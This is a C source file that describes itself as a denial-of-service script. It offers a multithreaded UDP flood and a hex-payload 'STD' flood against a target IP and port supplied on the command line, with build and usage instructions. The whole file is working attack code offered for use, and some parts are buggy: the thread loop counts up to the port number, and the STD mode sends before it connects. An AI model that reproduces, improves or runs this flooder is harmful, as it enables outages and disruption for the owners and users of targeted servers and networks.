/*[+]=====================================[+]
   |       DoS Script In C - Tragedy       |
   |  Hexed STD From Cayo + UDP On Thread  |
   |  Run On Server (Like A "Perl Script") |
   |  gcc -o Rail Rail.c -pthread; ./Rail  |
  [+]=====================================[+]
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>
 
#define STD_PACKETS 1250

//UDP Thread
struct t_data {int payload_size; struct sockaddr_in sin; int sock;};
void *UDPThread(void *data)
{
    struct t_data *t = (struct t_data *)data;
    struct sockaddr_in sin = t->sin;
    char *payload = malloc(t->payload_size + 1);
    int i;
    srand(time(NULL));
    for(i = 0; i < t->payload_size; i++)
    {
        payload[i] = rand()%256;
    }
    while(1)
    {
        sendto(t->sock,payload,t->payload_size,0,(struct sockaddr *)&sin,sizeof(sin));
    }
}
//STD Flood (From Cayo)
void SendSTD(unsigned char *Target, int Port, int Secs)
{
    int STD_HEX;
    STD_HEX = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *HexString = malloc(1024);
    memset(HexString, 0, 1024);
    hp = gethostbyname(Target);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = Port;
    unsigned int a = 0;
    while(1)
    {
        char * Strings[] = {    
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x21\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45"
        };
        if (a >= 50)
        {
            HexString = Strings[rand() % (sizeof(Strings) / sizeof(char *))];
            send(STD_HEX, HexString, STD_PACKETS, 0);
            connect(STD_HEX,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + Secs)
            {
                close(STD_HEX);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
}
main(int argc, char **argv)
{
    if(argc < 2)
    {
        printf("\x1b[31m[Invalid Syntax] Usage = %s <METHOD(UDP/STD)>\x1b[0m\n", argv[0]);
        exit(1);
    }
    if(!strcmp(argv[1], "UDP"))
    {
        if(argc != 7)
        {
            printf("\x1b[31m[Invalid Syntax] Usage = %s UDP <TARGET> <PORT> <THREADS> <SIZE> <TIME>\x1b[0m\n", argv[0]);
            exit(1);
        }
        else
        {
            printf("\n\x1b[1;36m[+] UDP Railing -> %s For %s Seconds | CNTRL+Z To Stop [+]\x1b[0m\n", argv[2], argv[6]);
            int sock = socket(AF_INET,SOCK_DGRAM,0);
            struct sockaddr_in sin;
            bzero(&sin,sizeof(sin));
            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = inet_addr(argv[2]);
            sin.sin_port = htons(atoi(argv[3]));
            pthread_t thread[atoi(argv[4])];
            struct t_data t[atoi(argv[4])];
            int i;
            for(i = 0; i < atoi(argv[3]); i++)
            {
                t[i].payload_size = atoi(argv[5]);
                t[i].sin = sin;
                t[i].sock = sock;
                pthread_create(&thread[i],NULL,&UDPThread,(void *) &t[i]);
            }
            sleep(atoi(argv[6]));
            return 0;
        }
    }
    if(!strcmp(argv[1], "STD"))
    {
        if(argc < 4)
        {
            printf("\n\x1b[31m[Invalid Syntax] Usage = %s STD <TARGET> <PORT> <TIME>\x1b[0m\n", argv[0]);
            exit(0);
        }
        else
        {
            unsigned char *Target = argv[2];
            int Port = atoi(argv[3]);
            int Time = atoi(argv[4]);
            printf("\n\x1b[1;36m[+] Hex Railing -> %s For %s Seconds | CNTRL+Z To Stop [+]\x1b[0m\n", argv[2], argv[4]);
            SendSTD(Target, Port, Time);
            exit(0);
        }
    }
}